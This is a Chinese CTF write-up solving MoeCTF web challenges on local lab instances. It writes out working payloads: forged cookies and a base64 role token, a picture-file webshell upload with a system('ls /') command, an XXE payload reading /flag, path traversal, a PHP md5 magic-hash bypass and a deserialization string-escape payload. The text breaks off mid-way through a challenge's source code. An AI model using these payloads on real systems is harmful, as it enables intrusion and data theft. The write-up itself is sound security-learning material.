<p><strong>写的不好各位师傅见谅</strong></p>
<h1 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h1><p>CHALLENGE: http<br>DESCRIPTION: 听说这个http里还有个什么东西叫饼干，也不知道是不是吃的</p>
<p>根据题目描述，貌似和数据包有关系使用代理软件连接节点访问发现按照要求提交参数即可获得</p>
<p><img src="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230907111357690.png" alt="image-20230907111357690"></p>
<pre><code class="bash">POST /?UwU=u HTTP/1.1
Host: localhost:64168
Cache-Control: max-age=0
sec-ch-ua: &quot;Chromium&quot;;v=&quot;109&quot;, &quot;Not_A Brand&quot;;v=&quot;99&quot;
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: &quot;Windows&quot;
Upgrade-Insecure-Requests: 1
User-Agent: MoeBrowser
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
X-Forwarded-For:127.0.0.1
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: character=admin
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 5

Luv=u
</code></pre>
<p>按照要求提交参数即可</p>
<h1 id="Web入门指北"><a href="#Web入门指北" class="headerlink" title="Web入门指北"></a>Web入门指北</h1><p>解出PDF编码即可</p>
<h1 id="彼岸的flag"><a href="#彼岸的flag" class="headerlink" title="彼岸的flag"></a>彼岸的flag</h1><p>CHALLENGE: 彼岸的flag<br>DESCRIPTION: 我们在某个平行宇宙中得到了一段moectf群的聊天记录，粗心的出题人在这个聊天平台不小心泄露了自己的flag</p>
<p><strong>打开可见一个聊天页面</strong></p>
<p><img src="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230907151259825.png" alt="image-20230907151259825"></p>
<p><img src="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230907151709517.png" alt="image-20230907151709517"></p>
<h1 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h1><p>CHALLENGE: cookie<br>DESCRIPTION: <strong>本题无需扫描器&#x2F;爆破</strong><br>hint: readme只是一个样例，不是拿来复制的</p>
<p>根据题目给出的附件大致意思需要注册用户来登录获取flag</p>
<p><img src="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230907152055953.png" alt="image-20230907152055953"></p>
<pre><code class="bash">POST /register HTTP/1.1
Host: localhost:62915
sec-ch-ua: &quot;Chromium&quot;;v=&quot;109&quot;, &quot;Not_A Brand&quot;;v=&quot;99&quot;
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: &quot;Windows&quot;
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: character=guest
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 0

{
    &quot;username&quot;:&quot;abc&quot;,
    &quot;password&quot;:&quot;123456&quot;
}
</code></pre>
<p><img src="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230907152326552.png" alt="image-20230907152326552"></p>
<p>访问登录接口使用注册的账号进行登录可发现存在token</p>
<p><img src="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230907152633221.png" alt="image-20230907152633221"></p>
<pre><code>eyJ1c2VybmFtZSI6ICJhYmMiLCAicGFzc3dvcmQiOiAiMTIzNDU2IiwgInJvbGUiOiAidXNlciJ9

{&quot;username&quot;: &quot;abc&quot;, &quot;password&quot;: &quot;123456&quot;, &quot;role&quot;: &quot;user&quot;}

base64
</code></pre>
<p><img src="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230907153346433.png" alt="image-20230907153346433"></p>
<pre><code>更改token即可
eyJ1c2VybmFtZSI6ICJhYmMiLCAicGFzc3dvcmQiOiAiMTIzNDU2IiwgInJvbGUiOiAiYWRtaW4ifQ==
{&quot;username&quot;: &quot;abc&quot;, &quot;password&quot;: &quot;123456&quot;, &quot;role&quot;: &quot;admin&quot;}
base64编码
</code></pre>
<p><img src="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230907153530460.png" alt="image-20230907153530460"></p>
<h1 id="gas-gas-gas"><a href="#gas-gas-gas" class="headerlink" title="gas!gas!gas!"></a>gas!gas!gas!</h1><p>CHALLENGE: gas!gas!gas!<br>DESCRIPTION: Klutton这个假期信心满满地准备把驾照拿下，于是他仔细地学习了好多漂移视频，还准备了这么一个赛博赛车场；诶，不对，开车好像不是用键盘开的？</p>
<p>打开题目需要连续对坚持五伦</p>
<p><img src="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230907153929231.png" alt="image-20230907153929231"></p>
<p>查看源码发现存在如下片段</p>
<pre><code class="HTML"> &lt;form action=&quot;/&quot; method=&quot;POST&quot;&gt;
    &lt;label for=&quot;driver&quot;&gt;选手:&lt;/label&gt;
    &lt;input type=&quot;text&quot; id=&quot;driver&quot; name=&quot;driver&quot; required&gt;&lt;br&gt;&lt;br&gt;
    
    &lt;label for=&quot;steering_control&quot;&gt;方向控制:&lt;/label&gt;
    &lt;select id=&quot;steering_control&quot; name=&quot;steering_control&quot; required&gt;
      &lt;option value=&quot;-1&quot;&gt;左&lt;/option&gt;
      &lt;option value=&quot;0&quot; selected&gt;直行&lt;/option&gt;
      &lt;option value=&quot;1&quot;&gt;右&lt;/option&gt;
    &lt;/select&gt;&lt;br&gt;&lt;br&gt;

    &lt;label for=&quot;throttle&quot;&gt;油门控制:&lt;/label&gt;
    &lt;select id=&quot;throttle&quot; name=&quot;throttle&quot; required&gt;
      &lt;option value=&quot;0&quot;&gt;松开&lt;/option&gt;
      &lt;option value=&quot;1&quot;&gt;保持&lt;/option&gt;
      &lt;option value=&quot;2&quot; selected&gt;全开&lt;/option&gt;
    &lt;/select&gt;&lt;br&gt;&lt;br&gt;
    
    &lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;
  &lt;/form&gt;
</code></pre>
<p>根据这些信息编写脚本即可</p>
<pre><code class="python">import requests
import re
url = &#39;http://localhost:64461/&#39;
headers = {&quot;Content-Type&quot;:&quot;application/x-www-form-urlencoded&quot;}
s = requests.Session()
req_post = s.post(
    url=url,
    data=&#39;driver=q1&amp;steering_control=0&amp;throttle=2&#39;,
    headers=headers)
print(f&#39;cookies = {s.cookies}&#39;)
post_data = &#39;driver=q1jun&amp;steering_control=0&amp;throttle=2&#39;
print(re.findall(r&#39;&lt;h3&gt;&lt;font color=&quot;red&quot;&gt;(.*)&lt;/font&gt;&lt;/h3&gt;&lt;/div&gt;&#39;,req_post.text)[0])
req = req_post.text
steering_control = 0
throttle = 0
for _ in range(7):
    if &#39;弯道向左&#39; in req_post.text:
        steering_control = 1
    if &#39;弯道向右&#39; in req_post.text:
        steering_control = -1
    if &#39;弯道直行&#39; in req_post.text:
        steering_control = 0
    if &#39;保持这个速度&#39; in req_post.text:
        throttle = 1
    if &#39;抓地力太大了&#39; in req_post.text:
        throttle = 2
    if &#39;抓地力太小了&#39; in req_post.text:
        throttle = 0
    print(f&#39;{steering_control =}&#39;)
    print(f&#39;{throttle =}&#39;)
    req_post = s.post(
        url=url,
        data=f&#39;driver=q1&amp;steering_control={steering_control}&amp;throttle={throttle}&#39;,
        headers=headers
    )
    print(req_post.text)
    # print(re.findall(r&#39;&lt;h3&gt;&lt;font color=&quot;red&quot;&gt;(.*)&lt;/font&gt;&lt;/h3&gt;&lt;/div&gt;&#39;,req_post.text)[0])
    print(f&#39;cookies = {s.cookies}&#39;)
</code></pre>
<h1 id="moe图床"><a href="#moe图床" class="headerlink" title="moe图床"></a>moe图床</h1><p>CHALLENGE: moe图床<br>DESCRIPTION: 我们准备了一个moe图床用于上传一些图片</p>
<p><img src="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230907154510412.png" alt="image-20230907154510412"></p>
<p>正常的图片没啥问题，php就无法进行上传</p>
<p><img src="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230907154700645.png" alt="image-20230907154700645"></p>
<p>审计js源码发现用点分隔后缀名字多加一个点就把前一个点进行了绕过</p>
<p><img src="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230907155030664.png" alt="image-20230907155030664"></p>
<p>图片🐎可成功上传</p>
<p><img src="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230907155156281.png" alt="image-20230907155156281"></p>
<p>执行命令即可</p>
<pre><code>?cmd=system(%27ls%20/%27);
</code></pre>
<h1 id="解你的座驾"><a href="#解你的座驾" class="headerlink" title="解你的座驾"></a>解你的座驾</h1><p>CHALLENGE: 了解你的座驾<br>DESCRIPTION: 为了极致地漂移，我们准备了一个网站用于查找你喜欢的车车；听说flag也放在里面了，不过不在网站目录放在根目录应该没问题的吧。。。</p>
<p><img src="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230907155632658.png" alt="image-20230907155632658"></p>
<p>xml注入使用payload即可</p>
<pre><code>xml_content=%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22utf-8%22%3F%3E%3C!DOCTYPE%20xxe%20%5B%3C!ELEMENT%20name%20ANY%20%3E%3C!ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F%2Fflag%22%20%3E%5D%3E%3Cxml%3E%3Cname%3E%26xxe%3B%3C%2Fname%3E%3C%2Fxml%3E
</code></pre>
<h1 id="大海捞针"><a href="#大海捞针" class="headerlink" title="大海捞针"></a>大海捞针</h1><p>CHALLENGE: 大海捞针<br>DESCRIPTION: 该死，之前的平行宇宙由于flag的泄露被一股神秘力量抹去，我们脱离了与那个宇宙的连接了！不过不用担心，看起来出题人傻乎乎的是具有泄露flag的概率的，我们只需要连接多个平行宇宙…（难道flag在多元宇宙里是全局变量吗）</p>
<p>tips:仅有这道题要用到扫描器，请不要将爆破速度调整过快，flag是一定能找到的<br>环境：<br><a href="http://101.42.178.83:7771/">http://101.42.178.83:7771/</a></p>
<p>打开题目可见只需要bp跑一到一千的数字即可</p>
<pre><code>use /?id=&lt;1-1000&gt; to connect to different parallel universes
</code></pre>
<p><img src="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230907160340776.png" alt="image-20230907160340776"></p>
<p><img src="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230907160551761.png" alt="image-20230907160551761"></p>
<h1 id="meo图床"><a href="#meo图床" class="headerlink" title="meo图床"></a>meo图床</h1><p>CHALLENGE: meo图床<br>DESCRIPTION: 我们准备了一个meo(?)图床用于上传一些图片</p>
<pre><code>可以直接上传php但是不进行解析，查看发现存在文件包含
</code></pre>
<p><img src="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230907162316680.png" alt="image-20230907162316680"></p>
<pre><code>读取这个发现如下提示
http://localhost:54781/images.php?name=../../../../../../flag

&lt;!--Fl3g_n0t_Here_dont_peek!!!!!.php--&gt;
</code></pre>
<pre><code class="php">&lt;?php

highlight_file(__FILE__);

if (isset($_GET[&#39;param1&#39;]) &amp;&amp; isset($_GET[&#39;param2&#39;])) {
    $param1 = $_GET[&#39;param1&#39;];
    $param2 = $_GET[&#39;param2&#39;];

    if ($param1 !== $param2) {
        
        $md5Param1 = md5($param1);
        $md5Param2 = md5($param2);

        if ($md5Param1 == $md5Param2) {
            echo &quot;O.O!! &quot; . getenv(&quot;FLAG&quot;);
        } else {
            echo &quot;O.o??&quot;;
        }
    } else {
        echo &quot;o.O?&quot;;
    }
} else {
    echo &quot;O.o?&quot;;
}

?&gt;
</code></pre>
<p>md50e进行绕过</p>
<pre><code>param1=QNKCDZO&amp;param2=240610708
</code></pre>
<h1 id="夺命十三枪"><a href="#夺命十三枪" class="headerlink" title="夺命十三枪"></a>夺命十三枪</h1><p>CHALLENGE: 夺命十三枪<br>DESCRIPTION: 夺命十三枪！然后是啥来着？</p>
<p>主页如下所示：</p>
<pre><code class="php">&lt;?php
highlight_file(__FILE__);

require_once(&#39;Hanxin.exe.php&#39;);

$Chant = isset($_GET[&#39;chant&#39;]) ? $_GET[&#39;chant&#39;] : &#39;夺命十三枪&#39;;

$new_visitor = new Omg_It_Is_So_Cool_Bring_Me_My_Flag($Chant);

$before = serialize($new_visitor);
$after = Deadly_Thirteen_Spears::Make_a_Move($before);
echo &#39;Your Movements: &#39; . $after . &#39;&lt;br&gt;&#39;;

try{
    echo unserialize($after);
}catch (Exception $e) {
    echo &quot;Even Caused A Glitch...&quot;;
}
?&gt;
</code></pre>
<p>很明显是反序列化，根据代码还有一个’Hanxin.exe.php’页面</p>
<pre><code class="php">&lt;?php

if (basename($_SERVER[&#39;SCRIPT_FILENAME&#39;]) === basename(__FILE__)) {
    highlight_file(__FILE__);
}

class Deadly_Thirteen_Spears{
    private static $Top_Secret_Long_Spear_Techniques_Manual = array(
        &quot;di_yi_qiang&quot; =&gt; &quot;Lovesickness&quot;,
        &quot;di_er_qiang&quot; =&gt; &quot;Heartbreak&quot;,
        &quot;di_san_qiang&quot; =&gt; &quot;Blind_Dragon&quot;,
        &quot;di_si_qiang&quot; =&gt; &quot;Romantic_charm&quot;,
        &quot;di_wu_qiang&quot; =&gt; &quot;Peerless&quot;,
        &quot;di_liu_qiang&quot; =&gt; &quot;White_Dragon&quot;,
        &quot;di_qi_qiang&quot; =&gt; &quot;Penetrating_Gaze&quot;,
        &quot;di_ba_qiang&quot; =&gt; &quot;Kunpeng&quot;,
        &quot;di_jiu_qiang&quot; =&gt; &quot;Night_Parade_of_a_Hundred_Ghosts&quot;,
        &quot;di_shi_qiang&quot; =&gt; &quot;Overlord&quot;,
        &quot;di_shi_yi_qiang&quot; =&gt; &quot;Letting_Go&quot;,
        &quot;di_shi_er_qiang&quot; =&gt; &quot;Decisive_Victory&quot;,
        &quot;di_shi_san_qiang&quot; =&gt; &quot;Unrepentant_Lethality&quot;
    );

    public static function Make_a_Move($move){
        foreach(self::$Top_Secret_Long_Spear_Techniques_Manual as $index =&gt; $movement){
            $move = str_replace($index, $movement, $move);
        }
        return $move;
    }
}

class Omg_It_Is_So_Cool_Bring_Me_My_Flag{

    public $Chant = &#39;&#39;;
    public $Spear_Owner = &#39;Nobody&#39;;

    function __construct($chant){
        $this-&gt;Chant = $chant;
        $this-&gt;Spear_Owner = &#39;Nobody&#39;;
    }

    function __toString(){
        if($this-&gt;Spear_Owner !== &#39;MaoLei&#39;){
            return &#39;Far away from COOL...&#39;;
        }
        else{
            return &quot;Omg You&#39;re So COOOOOL!!! &quot; . getenv(&#39;FLAG&#39;);
        }
    }
}

?&gt;
</code></pre>
<p>问题的关键，关键的问题，就很明显了，存在一个静态引用函数Make_a_Move()其中的</p>
<pre><code class="php">$move = str_replace($index, $movement, $move);

#存在反序列化字符串逃逸，不可控的后缀变的可控制
</code></pre>
<pre><code class="bash">目的是在夺命十三枪后面修改为&quot;;s:11:&quot;Spear_Owner&quot;;s:6:&quot;MaoLei&quot;;}，该字符串长度为35，根据代码可以知道&quot;di_qi_qiang&quot; =&gt; &quot;Penetrating_Gaze&quot;,刚好是从11-&gt;16，每次转换可以逃逸5个字符串，只需要重复7次&quot;di_qi_qiang&quot;即可完成逃逸



chant=di_qi_qiangdi_qi_qiangdi_qi_qiangdi_qi_qiangdi_qi_qiangdi_qi_qiangdi_qi_qiang&quot;;s:11:&quot;Spear_Owner&quot;;s:6:&quot;MaoLei&quot;;}
</code></pre>
<h1 id="signin"><a href="#signin" class="headerlink" title="signin"></a>signin</h1><p>CHALLENGE: signin<br>DESCRIPTION: 真的是signin（<br><strong>本题无需扫描器&#x2F;爆破</strong></p>
<p>题目代码:</p>
<pre><code class="python">from secrets import users, salt
import hashlib
import base64
import json
import http.server

with open(&quot;flag.txt&quot;,&quot;r&quot;) as f:
    FLAG = f.read().strip()

def gethash(*items):
    c = 0
    for item in items:
        if item is None:
            continue
        c ^= int.from_bytes(hashlib.md5(f&quot;{salt}[{item}]{salt}&quot;.encode()).digest(), &quot;big&quot;) # it looks so complex! but is it safe enough?
    return hex(c)[2:]

assert &quot;admin&quot; in users
assert users[&quot;admin&quot;] == &quot;admin&quot;

hashed_users = dict((k,gethash(k,v)) for k,v in users.items())

eval(int.to_bytes(0x636d616f686e69656e61697563206e6965756e63696165756e6320696175636e206975616e6363616361766573206164^8651845801355794822748761274382990563137388564728777614331389574821794036657729487047095090696384065814967726980153,160,&quot;big&quot;,signed=True).decode().translate({ord(c):None for c in &quot;\x00&quot;})) # what is it?
    
def decrypt(data:str):
        for x in range(5):
            data = base64.b64encode(data).decode() # ummm...? It looks like it&#39;s just base64 encoding it 5 times? truely?
        return data

__page__ = base64.b64encode(&quot;PCFET0NUWVBFIGh0bWw+CjxodG1sPgo8aGVhZD4KICAgIDx0aXRsZT5zaWduaW48L3RpdGxlPgogICAgPHNjcmlwdD4KICAgICAgICBbXVsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKFtdK3t9KVsrISFbXV0rKCEhW10rW10pWyshIVtdXSsoISFbXStbXSlbK1tdXV1bKFtdK3t9KVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKCEhW10rW10pWyshIVtdXSsoW11bW11dK1tdKVsrW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdXSsoISFbXStbXSlbK1tdXSsoW10re30pWyshIVtdXSsoISFbXStbXSlbKyEhW11dXSgoK3t9K1tdKVsrISFbXV0rKCEhW10rW10pWytbXV0rKFtdK3t9KVsrISFbXV0rKFtdK3t9KVshK1tdKyEhW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXV0rW11bKCFbXStbXSlbIStbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyghIVtdK1tdKVsrISFbXV0rKCEhW10rW10pWytbXV1dWyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdXSsoW10re30pWyshIVtdXSsoW11bW11dK1tdKVsrISFbXV0rKCFbXStbXSlbIStbXSshIVtdKyEhW11dKyghIVtdK1tdKVsrW11dKyghIVtdK1tdKVsrISFbXV0rKFtdW1tdXStbXSlbK1tdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKFtdK3t9KVsrISFbXV0rKCEhW10rW10pWyshIVtdXV0oKCEhW10rW10pWyshIVtdXSsoW11bW11dK1tdKVshK1tdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKFtdW1tdXStbXSlbK1tdXSsoISFbXStbXSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW11dKyhbXVtbXV0rW10pWytbXV0rKFtdW1tdXStbXSlbKyEhW11dKyhbXVtbXV0rW10pWyErW10rISFbXSshIVtdXSsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKFtdK3t9KVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKygre30rW10pWyshIVtdXSsoW10rW11bKCFbXStbXSlbIStbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyghIVtdK1tdKVsrISFbXV0rKCEhW10rW10pWytbXV1dWyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdXSsoW10re30pWyshIVtdXSsoW11bW11dK1tdKVsrISFbXV0rKCFbXStbXSlbIStbXSshIVtdKyEhW11dKyghIVtdK1tdKVsrW11dKyghIVtdK1tdKVsrISFbXV0rKFtdW1tdXStbXSlbK1tdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKFtdK3t9KVsrISFbXV0rKCEhW10rW10pWyshIVtdXV0oKCEhW10rW10pWyshIVtdXSsoW11bW11dK1tdKVshK1tdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKFtdW1tdXStbXSlbK1tdXSsoISFbXStbXSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW11dKyghW10rW10pWyErW10rISFbXV0rKFtdK3t9KVsrISFbXV0rKFtdK3t9KVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKygre30rW10pWyshIVtdXSsoISFbXStbXSlbK1tdXSsoW11bW11dK1tdKVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSkoIStbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10pKVshK1tdKyEhW10rISFbXV0rKFtdW1tdXStbXSlbIStbXSshIVtdKyEhW11dKSghK1tdKyEhW10rISFbXSshIVtdKShbXVsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKFtdK3t9KVsrISFbXV0rKCEhW10rW10pWyshIVtdXSsoISFbXStbXSlbK1tdXV1bKFtdK3t9KVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKCEhW10rW10pWyshIVtdXSsoW11bW11dK1tdKVsrW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdXSsoISFbXStbXSlbK1tdXSsoW10re30pWyshIVtdXSsoISFbXStbXSlbKyEhW11dXSgoISFbXStbXSlbKyEhW11dKyhbXVtbXV0rW10pWyErW10rISFbXSshIVtdXSsoISFbXStbXSlbK1tdXSsoW11bW11dK1tdKVsrW11dKyghIVtdK1tdKVsrISFbXV0rKFtdW1tdXStbXSlbKyEhW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXV0rKFtdW1tdXStbXSlbIStbXSshIVtdKyEhW11dKyghW10rW10pWyErW10rISFbXSshIVtdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXV0rKCt7fStbXSlbKyEhW11dKyhbXStbXVsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKFtdK3t9KVsrISFbXV0rKCEhW10rW10pWyshIVtdXSsoISFbXStbXSlbK1tdXV1bKFtdK3t9KVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKCEhW10rW10pWyshIVtdXSsoW11bW11dK1tdKVsrW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdXSsoISFbXStbXSlbK1tdXSsoW10re30pWyshIVtdXSsoISFbXStbXSlbKyEhW11dXSgoISFbXStbXSlbKyEhW11dKyhbXVtbXV0rW10pWyErW10rISFbXSshIVtdXSsoISFbXStbXSlbK1tdXSsoW11bW11dK1tdKVsrW11dKyghIVtdK1tdKVsrISFbXV0rKFtdW1tdXStbXSlbKyEhW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXV0rKCFbXStbXSlbIStbXSshIVtdXSsoW10re30pWyshIVtdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXV0rKCt7fStbXSlbKyEhW11dKyghIVtdK1tdKVsrW11dKyhbXVtbXV0rW10pWyErW10rISFbXSshIVtdKyEhW10rISFbXV0rKFtdK3t9KVsrISFbXV0rKFtdW1tdXStbXSlbKyEhW11dKSghK1tdKyEhW10rISFbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXSkpWyErW10rISFbXSshIVtdXSsoW11bW11dK1tdKVshK1tdKyEhW10rISFbXV0pKCErW10rISFbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10pKChbXSt7fSlbK1tdXSlbK1tdXSsoIStbXSshIVtdKyEhW10rW10pKyhbXVtbXV0rW10pWyErW10rISFbXV0pKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXV0rKFtdK3t9KVshK1tdKyEhW11dKyghIVtdK1tdKVsrW11dKyhbXSt7fSlbKyEhW11dKygre30rW10pWyshIVtdXSkoIStbXSshIVtdKyEhW10rISFbXSkKICAgICAgICB2YXIgXzB4ZGI1ND1bJ3N0cmluZ2lmeScsJ2xvZycsJ3Bhc3N3b3JkJywnL2xvZ2luJywnUE9TVCcsJ2dldEVsZW1lbnRCeUlkJywndGhlbiddO3ZhciBfMHg0ZTVhPWZ1bmN0aW9uKF8weGRiNTRmYSxfMHg0ZTVhOTQpe18weGRiNTRmYT1fMHhkYjU0ZmEtMHgwO3ZhciBfMHg0ZDhhNDQ9XzB4ZGI1NFtfMHhkYjU0ZmFdO3JldHVybiBfMHg0ZDhhNDQ7fTt3aW5kb3dbJ2FwaV9iYXNlJ109Jyc7ZnVuY3Rpb24gbG9naW4oKXtjb25zb2xlW18weDRlNWEoJzB4MScpXSgnbG9naW4nKTt2YXIgXzB4NWYyYmViPWRvY3VtZW50W18weDRlNWEoJzB4NScpXSgndXNlcm5hbWUnKVsndmFsdWUnXTt2YXIgXzB4NGZkMjI2PWRvY3VtZW50W18weDRlNWEoJzB4NScpXShfMHg0ZTVhKCcweDInKSlbJ3ZhbHVlJ107dmFyIF8weDFjNjFkOT1KU09OW18weDRlNWEoJzB4MCcpXSh7J3VzZXJuYW1lJzpfMHg1ZjJiZWIsJ3Bhc3N3b3JkJzpfMHg0ZmQyMjZ9KTt2YXIgXzB4MTBiOThlPXsncGFyYW1zJzphdG9iKGF0b2IoYXRvYihhdG9iKGF0b2IoXzB4MWM2MWQ5KSkpKSl9O2ZldGNoKHdpbmRvd1snYXBpX2Jhc2UnXStfMHg0ZTVhKCcweDMnKSx7J21ldGhvZCc6XzB4NGU1YSgnMHg0JyksJ2JvZHknOkpTT05bXzB4NGU1YSgnMHgwJyldKF8weDEwYjk4ZSl9KVtfMHg0ZTVhKCcweDYnKV0oZnVuY3Rpb24oXzB4Mjk5ZDRkKXtjb25zb2xlW18weDRlNWEoJzB4MScpXShfMHgyOTlkNGQpO30pO30KICAgIDwvc2NyaXB0Pgo8L2hlYWQ+Cjxib2R5PgogICAgPGgxPmV6U2lnbmluPC9oMT4KICAgIDxwPlNpZ24gaW4gdG8geW91ciBhY2NvdW50PC9wPgogICAgPHA+ZGVmYXVsdCB1c2VybmFtZSBhbmQgcGFzc3dvcmQgaXMgYWRtaW4gYWRtaW48L3A+CiAgICA8cD5Hb29kIEx1Y2shPC9wPgoKICAgIDxwPgogICAgICAgIHVzZXJuYW1lIDxpbnB1dCBpZD0idXNlcm5hbWUiPgogICAgPC9wPgogICAgPHA+CiAgICAgICAgcGFzc3dvcmQgPGlucHV0IGlkPSJwYXNzd29yZCIgdHlwZT0icGFzc3dvcmQiPgogICAgPC9wPgogICAgPGJ1dHRvbiBpZCA9ICJsb2dpbiI+CiAgICAgICAgTG9naW4KICAgIDwvYnV0dG9uPgo8L2JvZHk+CjxzY3JpcHQ+CiAgICBjb25zb2xlLmxvZygiaGVsbG8/IikKICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJsb2dpbiIpLmFkZEV2ZW50TGlzdGVuZXIoImNsaWNrIiwgbG9naW4pOwo8L3NjcmlwdD4KPC9odG1sPg==&quot;)
        
class MyHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        try:
            if self.path == &quot;/&quot;:
                self.send_response(200)
                self.end_headers()
                self.wfile.write(__page__)
            else:
                self.send_response(404)
                self.end_headers()
                self.wfile.write(b&quot;404 Not Found&quot;)
        except Exception as e:
            print(e)
            self.send_response(500)
            self.end_headers()
            self.wfile.write(b&quot;500 Internal Server Error&quot;)

    def do_POST(self):
        try:
            if self.path == &quot;/login&quot;:
                body = self.rfile.read(int(self.headers.get(&quot;Content-Length&quot;)))
                payload = json.loads(body)
                params = json.loads(decrypt(payload[&quot;params&quot;]))
                print(params)
                if params.get(&quot;username&quot;) == &quot;admin&quot;:
                    self.send_response(403)
                    self.end_headers()
                    self.wfile.write(b&quot;YOU CANNOT LOGIN AS ADMIN!&quot;)
                    print(&quot;admin&quot;)
                    return
                if params.get(&quot;username&quot;) == params.get(&quot;password&quot;):
                    self.send_response(403)
                    self.end_headers()
                    self.wfile.write(b&quot;YOU CANNOT LOGIN WITH SAME USERNAME AND PASSWORD!&quot;)
                    print(&quot;same&quot;)
                    return
                hashed = gethash(params.get(&quot;username&quot;),params.get(&quot;password&quot;))
                for k,v in hashed_users.items():
                    if hashed == v:
                        data = {
                            &quot;user&quot;:k,
                            &quot;hash&quot;:hashed,
                            &quot;flag&quot;: FLAG if k == &quot;admin&quot; else &quot;flag{YOU_HAVE_TO_LOGIN_IN_AS_ADMIN_TO_GET_THE_FLAG}&quot;
                        }
                        self.send_response(200)
                        self.end_headers()
                        self.wfile.write(json.dumps(data).encode())
                        print(&quot;success&quot;)
                        return
                self.send_response(403)
                self.end_headers()
                self.wfile.write(b&quot;Invalid username or password&quot;)
            else:
                self.send_response(404)
